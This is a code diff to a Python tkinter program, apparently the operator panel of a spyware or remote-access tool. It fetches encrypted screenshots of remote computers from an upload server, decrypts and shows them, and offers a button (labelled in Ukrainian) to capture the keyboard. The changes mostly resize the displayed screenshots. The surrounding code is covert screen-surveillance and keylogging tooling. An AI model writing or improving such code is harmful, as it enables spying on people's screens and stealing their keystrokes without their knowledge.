@@ -4,6 +4,7 @@ import time
 import requests
 import subprocess
 import pyAesCrypt
+from PIL import Image, ImageEnhance, ImageTk
 from functools import update_wrapper, partial
 import multiprocessing
 from multiprocessing import Pool,Process,Queue,Lock
@@ -37,10 +38,6 @@ def update_clock(res):
     global SCREENFILE
     global screenshoturl
     global flg
-    while flg==True:
-        time.sleep(1)
-        print(flg)
-    flg=True
     with open(SCREENFILE, 'wb') as handle:
         response = requests.get(screenshoturl, stream=True)
         hdrs=response.headers
@@ -54,11 +51,15 @@ def update_clock(res):
     try:
         MemoryCrypter(SCREENFILE,0,res)
         photo=PhotoImage(file=f'.\{SCREENFILE}')
-        rLabel.image=photo
-        rLabel.photo_ref =photo
-        rLabel.config(image=photo)
-        rLabel["image"]=photo 
-        flg=False
+        
+        original = Image.open(f'.\{SCREENFILE}')
+        # original = original.convert(mode="RGB")
+        resized = original.resize((1200, 600),Image.ANTIALIAS)
+        image = ImageTk.PhotoImage(resized) 
+        rLabel.image=image
+        rLabel.photo_ref =image
+        rLabel.config(image=image)
+        rLabel["image"]=image 
     except ValueError:
         print('Wrong pass')
 
@@ -83,7 +84,6 @@ def click():
     SCREENFILE=f"{res}_screenshot.png"
     screenshoturl=f"{URL}/COMPNAME_{res}uploaddir/screenshots/newpng.png"
     print(screenshoturl)
-    flg=False
     window.after(1000, update_clock(res))
     window.after(1000, click)   
     
@@ -111,11 +111,11 @@ if __name__ == '__main__':
     button1 = Button(text = "Показати\nскріншот", command = click)
     button1.place(x = 600, y = 10, width = 100, height = 35)
     
-    button1 = Button(text = "Захопити клавіатуру", command = click2)
-    button1.place(x = 700, y = 10, width = 130, height = 35)    
+    button2 = Button(text = "Захопити клавіатуру", command = click2)
+    button2.place(x = 700, y = 10, width = 130, height = 35)    
 
-    photo=PhotoImage(file='.\password.png')
+    photo=PhotoImage(file='')
     rLabel = Label(window,image = photo)
-    rLabel.place(x = 0, y = 120, width = 1350, height = 900)
-        
+    rLabel.place(x = 0, y = 100, width = 1200, height = 600)
+    # rLabel.place(x = 0, y = 0, width = 1350, height = 1100)    
     window.mainloop()	
